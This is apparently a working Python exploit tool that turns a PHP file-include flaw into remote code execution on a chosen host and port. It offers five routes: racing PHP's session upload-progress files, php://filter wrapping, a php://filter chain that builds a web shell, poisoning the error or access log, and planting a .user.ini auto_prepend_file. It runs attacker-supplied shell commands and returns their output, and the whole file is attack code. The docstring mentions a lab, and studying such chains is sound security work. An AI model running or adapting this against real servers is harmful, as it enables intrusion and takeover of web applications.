#!/usr/bin/env python3
"""Alternative inclusion vectors for the upload-progress include-race.

Broadens the base include-race so the chain needs less from the target app.
Reuses its upload-progress session poison read-only and swaps the read/trigger:
  direct     -- include the poisoned sess_<id> directly (raw-path sink + race).
  filter     -- reach it through a ``php://filter`` wrapper (sink blocks raw
                paths but honours php://; no allow_url_include).
  logpoison  -- include a poisoned error log (needs html_errors=Off) or access
                log (html_errors-independent; needs a header field logged).
  userini    -- drop a ``.user.ini`` auto_prepend_file via a docroot write; no
                include sink, no race (activation lags cache_ttl on warm workers).
  filterchain-- include-sink-ONLY php://filter RCE: synthesise
                ``<?php system($_GET[0]);?>`` via the php://filter chain builder
                (no poison/race/sid/allow_url_include). Landing table is the
                public synacktiv set; the from-scratch builder reaches 17/64.

All land uid=www-data in the lab. Pure stdlib, python3 -I safe.
"""

import argparse
import json
import os
import socket
import sys
import threading
import time
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import include_race as ir  # noqa: E402  (read-only reuse)

try:
    import savepath_sid_discover as a3  # noqa: E402  (candidate save_path/sid table)
except Exception:  # pragma: no cover - optional
    a3 = None

VECTORS = ("direct", "filter", "filterchain", "logpoison", "userini")


def _log(verbose, m):
    if verbose:
        print(m, flush=True)


# shared race driver (same poison + storm as the baseline; pluggable read URL)
def _storm_headers(host, base, cookie, storm):
    return (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={ir.BOUND}\r\n"
            f"Content-Length: {len(storm)}\r\nCookie: {cookie}\r\n"
            f"Connection: close\r\n\r\n").encode()


def _get_req(host, base, param, value, cookie):
    return (f"GET {base}?{param}=" + quote(value, safe="") +
            f" HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
            f"Connection: close\r\n\r\n").encode()


def _race(host, port, base, param, cmd, sess_values, cookie, parts, attempts,
          readers, verbose, settle=0.3):
    """Poison via upload-progress + storm, hammer include() of ONE candidate per
    round with all readers on it (baseline-tight timing), rotating the target
    candidate round-robin across rounds until a marker lands.

    Fanning readers across many candidates in one round DILUTES the ~tens-of-ms
    on-disk window (a reader is usually probing a wrong path when the window is
    open), so instead each round locks every reader onto a single candidate and
    the round counter walks the candidate list. `attempts` is auto-raised so each
    candidate is raced a few times. Returns (ok, out, hit)."""
    key = ir.make_key(cmd)
    storm = ir.build_storm_body(key, parts=parts)
    storm_hdr = _storm_headers(host, base, cookie, storm)
    ncand = len(sess_values)
    attempts = max(attempts, ncand * 2)  # cover every candidate a couple of times

    result, stop = {}, threading.Event()

    def reader(rq):
        while not stop.is_set():
            try:
                d = ir.http_raw(host, port, rq, timeout=8)
            except OSError:
                continue
            out = ir.extract(d)
            if out is not None or ir.MARK_S.encode() in d:
                result.update(ok=True, out=out or "")
                stop.set()
                return

    for n in range(1, attempts + 1):
        value = sess_values[(n - 1) % ncand]
        rq = _get_req(host, base, param, value, cookie)
        stop.clear()
        pool = [threading.Thread(target=reader, args=(rq,), daemon=True)
                for _ in range(readers)]
        for t in pool:
            t.start()
        try:
            with socket.create_connection((host, port), timeout=20) as s:
                s.sendall(storm_hdr + storm)
                ir._recv_all(s, 15)
        except OSError:
            pass
        time.sleep(settle)
        stop.set()
        for t in pool:
            t.join(timeout=3)
        if result.get("ok"):
            _log(verbose, f"[+] LANDED include({value}) (round {n})")
            return True, result.get("out"), value
        if verbose and n % 10 == 0:
            _log(verbose, f"    round {n}/{attempts}: no marker yet")
    return False, None, None


def _mint_or_app_sid(host, port, base, sid, verbose):
    if sid:
        return sid
    s = ir.get_sid(host, port, base)
    if s:
        _log(verbose, f"[*] app-issued sid {s}")
        return s
    if a3:
        s = a3.mint_sid()
        _log(verbose, f"[*] minted sid {s} (strict_mode=Off)")
        return s
    _log(verbose, "[-] no sid (app issues none; A3 unavailable). Pass --sid.")
    return None


def _candidates(sid, save_paths):
    """sess-file path candidates: the autodiscover table if available, else the
    simple save_path x sess_<id> list the baseline module ships."""
    if save_paths:
        return [f"{sp.rstrip('/')}/sess_{sid}" for sp in save_paths]
    if a3:
        return a3.sess_candidates(sid)
    return [f"{sp.rstrip('/')}/sess_{sid}" for sp in ir.SAVE_PATHS]


# vector: direct  (baseline parity)
def v_direct(host, port, cmd, base, param, sid, save_paths, parts, attempts,
             readers, verbose, **_):
    cands = _candidates(sid, save_paths)
    _log(verbose, f"[*] direct: {len(cands)} sess candidates x {readers} readers")
    return _race(host, port, base, param, cmd, cands,
                 f"PHPSESSID={sid}", parts, attempts, readers, verbose)


# vector: filter  (php://filter wrapper over the poisoned session file)
def v_filter(host, port, cmd, base, param, sid, save_paths, parts, attempts,
             readers, verbose, filter_chain=None, **_):
    cands = _candidates(sid, save_paths)
    # a benign passthrough chain reads the bytes unchanged; the raw '<?php' in
    # the poison is already code. Operators can pass a real convert.* chain.
    chain = (filter_chain + "/") if filter_chain else ""
    wrapped = [f"php://filter/{chain}resource={c}" for c in cands]
    _log(verbose, f"[*] filter: php://filter/{chain}resource=<sess> "
                  f"({len(wrapped)} candidates)")
    return _race(host, port, base, param, cmd, wrapped,
                 f"PHPSESSID={sid}", parts, attempts, readers, verbose)


# vector: filterchain  (include-sink-ONLY php://filter RCE -- no poison/race/sid)
_FC_MARK = "zzP2Szz"


def _http_get(host, port, path, timeout=8):
    """One plain GET; return the response BODY bytes."""
    s = socket.create_connection((host, port), timeout)
    try:
        s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Connection: close\r\n\r\n").encode())
        buf = b""
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    finally:
        s.close()
    return buf.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in buf else buf


def v_filterchain(host, port, cmd, base, param, php_bin="php", cmd_param="0",
                  resource="php://temp", table_in=None, verbose=True, **_):
    """Synthesise `<?php system($_GET[cmd_param]);?>` purely from a chained
    convert.iconv.* php://filter (NO poison/race/save_path/sid/allow_url_include)
    and include() it; the actual command rides in a second GET param so the chain
    stays short and reusable. The chain is BUILT + composition-VALIDATED against a
    local PHP of the target's build (``php_bin``; the throwaway bytes the chain
    emits land after ``?>`` as harmless text). Needs only an include() honouring
    php://."""
    import php_filter_chain as pfc
    payload = "<?php system($_GET[%s]);?>" % cmd_param
    table = {c: [g.split("|")] for c, g in pfc.PUBLIC_CONVERSIONS.items() if g}
    if table_in:
        derived = json.load(open(table_in))
        for c, lst in derived.items():
            seqs = lst if (lst and isinstance(lst[0], list)) else [lst]
            table.setdefault(c, []).extend(seqs)
    try:
        chain = pfc.build_chain_validated(payload, table, php_bin=php_bin,
                                          resource=resource, verbose=verbose)
    except Exception as e:  # build/validate failed (wrong php_bin version, etc.)
        _log(verbose, f"[-] filterchain: chain build failed: {e}")
        return False, None, None
    shellcmd = f"echo {_FC_MARK}; {cmd}; echo {_FC_MARK}"
    path = (f"{base}?{param}=" + quote(chain, safe="") +
            f"&{cmd_param}=" + quote(shellcmd, safe=""))
    _log(verbose, f"[*] filterchain: include php://filter chain ({len(chain)} B), "
                  f"cmd via ?{cmd_param}")
    try:
        body = _http_get(host, port, path)
    except OSError as e:
        _log(verbose, f"[-] filterchain: request failed: {e}")
        return False, None, None
    mk = _FC_MARK.encode()
    i = body.find(mk)
    j = body.find(mk, i + len(mk)) if i >= 0 else -1
    if i >= 0 and j > i:
        out = body[i + len(mk):j].decode("latin1", "replace").strip("\r\n")
        return True, out, "php://filter chain"
    _log(verbose, "[-] filterchain: markers not found in response")
    return False, None, None


# vector: logpoison  (PHP error-log poison via a bogus include path)
_ERRORLOG_PATHS = [
    "/var/log/php/error.log", "/var/log/php_errors.log",
    "/var/log/php-fpm/error.log", "/var/log/php8.4-fpm.log",
    "/tmp/php_errors.log", "/var/log/fpm-php.www.log",
]
_ACCESSLOG_PATHS = [
    "/var/log/php/access.log", "/var/log/php-fpm/access.log",
    "/var/log/php-fpm.access.log", "/var/log/php8.4-fpm.access.log",
    # web-server access logs (reachable only when the PHP worker shares the host
    # / a volume with the web server, e.g. mod_php; NOT in an nginx+fpm split):
    "/var/log/nginx/access.log", "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
]


def _poison_req(host, base, param, value, ua=None):
    ua_hdr = f"User-Agent: {ua}\r\n" if ua is not None else ""
    return (f"GET {base}?{param}=" + quote(value, safe="") +
            f" HTTP/1.1\r\nHost: {host}\r\n{ua_hdr}"
            f"Connection: close\r\n\r\n").encode()


def v_logpoison(host, port, cmd, base, param, log_paths=None, source="errorlog",
                verbose=True, tries=3, **_):
    """Persistent log-poison include (no upload_progress, no save_path, no race).
    source='errorlog': poison PHP's error log via a bogus include path that IS
    '<?php ...?>' (PHP logs the path verbatim). Requires html_errors=Off -- with
    the compiled default html_errors=On PHP escapes '<'->'&lt;' and the tag dies.
    source='accesslog': poison the fpm/web-server access log via a crafted
    User-Agent. fpm access logging does NOT pass through PHP's error formatter,
    so this is html_errors-INDEPENDENT; it needs an access log that records a
    header field (access.format with %{HTTP_USER_AGENT}e, or a web-server combined
    log) and is readable+includable by the worker."""
    key = ir.make_key(cmd)
    payload = key[1:] if key.startswith("x") else key  # drop the leading 'x'
    if source == "accesslog":
        log_paths = log_paths or _ACCESSLOG_PATHS
        _log(verbose, "[*] logpoison(accesslog): User-Agent poison -> include the "
                      "access log (html_errors-independent)")
        poison = _poison_req(host, base, param, "home", ua=payload)
    else:
        log_paths = log_paths or _ERRORLOG_PATHS
        _log(verbose, "[*] logpoison(errorlog): bogus-include-path poison -> "
                      "include the error log (needs html_errors=Off)")
        poison = _poison_req(host, base, param, payload)
    for _ in range(tries):
        try:
            ir.http_raw(host, port, poison, 8)
        except OSError:
            pass
        for lp in log_paths:
            try:
                d = ir.http_raw(host, port, _get_req(host, base, param, lp, ""), 8)
            except OSError:
                continue
            out = ir.extract(d)
            if out is not None or ir.MARK_S.encode() in d:
                _log(verbose, f"[+] LANDED include({lp})")
                return True, out, lp
    _log(verbose, f"[-] logpoison({source}): no marker. Confirm a worker-readable "
                  f"log path"
                  + (" + html_errors=Off." if source == "errorlog"
                     else " + an access log recording a header field."))
    return False, None, None


# vector: userini  (.user.ini auto_prepend_file -> dropped carrier; no LFI)
def _multipart_upload(host, port, base, field, filename, content, cookie=""):
    body = (f"--{ir.BOUND}\r\nContent-Disposition: form-data; name=\"{field}\"; "
            f"filename=\"{filename}\"\r\nContent-Type: application/octet-stream"
            f"\r\n\r\n").encode() + content + f"\r\n--{ir.BOUND}--\r\n".encode()
    ck = f"Cookie: {cookie}\r\n" if cookie else ""
    hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={ir.BOUND}\r\n"
           f"Content-Length: {len(body)}\r\n{ck}Connection: close\r\n\r\n").encode()
    return ir.http_raw(host, port, hdr + body, 10)


def v_userini(host, port, cmd, base, write_field="up", docroot="/var/www/html",
              carrier_name="p2s_carrier.jpg", trigger="/index.php",
              poll=320.0, verbose=True, **_):
    # poll default 320s: a worker that already served this dir before the drop
    # can keep activation pending up to max(user_ini.cache_ttl=300s,
    # realpath_cache_ttl=120s) ~= 300s (the realpath negative-stat of the new
    # .user.ini path and the per-worker user-ini cache both have to expire).
    # Freshly spawned/recycled workers (pm scaling, pm.max_requests) read it at
    # once, so under load it usually lands in seconds -- but a quiet, non-
    # recycling pool needs the full window, hence the generous default.
    key = ir.make_key(cmd)
    carrier = (key[1:] if key.startswith("x") else key).encode()
    _log(verbose, f"[*] userini: uploading carrier {carrier_name} + .user.ini "
                  f"(field={write_field}) then polling {trigger}")
    try:
        _multipart_upload(host, port, base, write_field, carrier_name, carrier)
        _multipart_upload(host, port, base, write_field, ".user.ini",
                          f'auto_prepend_file="{docroot.rstrip("/")}/'
                          f'{carrier_name}"\n'.encode())
    except OSError as e:
        _log(verbose, f"[-] userini: write failed ({e}); need a docroot-write sink")
        return False, None, None
    trig = (f"GET {trigger} HTTP/1.1\r\nHost: {host}\r\n"
            f"Connection: close\r\n\r\n").encode()
    deadline = time.time() + poll
    while time.time() < deadline:
        try:
            d = ir.http_raw(host, port, trig, 8)
        except OSError:
            time.sleep(0.5)
            continue
        out = ir.extract(d)
        if out is not None or ir.MARK_S.encode() in d:
            _log(verbose, f"[+] LANDED via .user.ini auto_prepend ({trigger})")
            return True, out, f"{docroot.rstrip('/')}/{carrier_name}"
        time.sleep(0.5)
    _log(verbose, "[-] userini: no marker within poll window. Confirm the write "
                  "landed in the docroot and user_ini.cache_ttl/realpath TTL.")
    return False, None, None


_DISPATCH = {
    "direct": v_direct, "filter": v_filter, "filterchain": v_filterchain,
    "logpoison": v_logpoison, "userini": v_userini,
}


def run(host, port, cmd, vector="filter", base="/index.php", param="page",
        sid=None, save_paths=None, parts=5000, attempts=25, readers=4,
        verbose=True, **kw):
    """Drive one inclusion vector. Returns (ok, output, detail)."""
    fn = _DISPATCH[vector]
    if vector in ("direct", "filter"):
        sid = _mint_or_app_sid(host, port, base, sid, verbose)
        if not sid:
            return False, None, None
        return fn(host, port, cmd, base=base, param=param, sid=sid,
                  save_paths=save_paths, parts=parts, attempts=attempts,
                  readers=readers, verbose=verbose, **kw)
    if vector in ("logpoison", "filterchain"):
        return fn(host, port, cmd, base=base, param=param, verbose=verbose, **kw)
    return fn(host, port, cmd, base=base, verbose=verbose, **kw)  # userini


def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--vector", choices=VECTORS, default="filter")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--base", default="/index.php")
    ap.add_argument("--param", default="page", help="include-sink GET param")
    ap.add_argument("--sid", help="session id (default: app-issued or A3-minted)")
    ap.add_argument("--save-path", action="append",
                    help="session save_path (repeatable; default: A3 table)")
    ap.add_argument("--filter-chain", default=None,
                    help="convert.* chain for the filter vector "
                         "(e.g. 'read=convert.iconv.UTF-8.UTF-8')")
    ap.add_argument("--php-bin", default="php",
                    help="filterchain: local PHP of the TARGET build used to "
                         "build+validate the chain (e.g. in a php:8.4.26 container)")
    ap.add_argument("--cmd-param", default="0",
                    help="filterchain: GET param carrying the shell command")
    ap.add_argument("--table-in", default=None,
                    help="filterchain: derived-gadget JSON to add as alternates")
    ap.add_argument("--log-path", action="append", help="logpoison log path(s)")
    ap.add_argument("--log-source", choices=("errorlog", "accesslog"),
                    default="errorlog",
                    help="logpoison sink: errorlog (needs html_errors=Off) or "
                         "accesslog (User-Agent poison, html_errors-independent)")
    ap.add_argument("--write-field", default="up", help="userini upload field")
    ap.add_argument("--docroot", default="/var/www/html", help="userini docroot")
    ap.add_argument("--trigger", default="/index.php", help="userini trigger page")
    ap.add_argument("--parts", type=int, default=5000)
    ap.add_argument("--attempts", type=int, default=25)
    ap.add_argument("--readers", type=int, default=4)
    args = ap.parse_args(argv)

    kw = {}
    if args.filter_chain:
        kw["filter_chain"] = args.filter_chain
    kw.update(php_bin=args.php_bin, cmd_param=args.cmd_param,
              table_in=args.table_in)
    if args.log_path:
        kw["log_paths"] = args.log_path
    kw["source"] = args.log_source
    kw.update(write_field=args.write_field, docroot=args.docroot,
              trigger=args.trigger)
    ok, out, hit = run(
        args.host, args.port, args.cmd, vector=args.vector, base=args.base,
        param=args.param, sid=args.sid, save_paths=args.save_path,
        parts=args.parts, attempts=args.attempts, readers=args.readers, **kw)
    if ok:
        print(f"[+] {args.vector}: OK via {hit}")
        if out:
            print(out.rstrip())
        return 0
    print(f"[-] {args.vector}: no execution")
    return 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
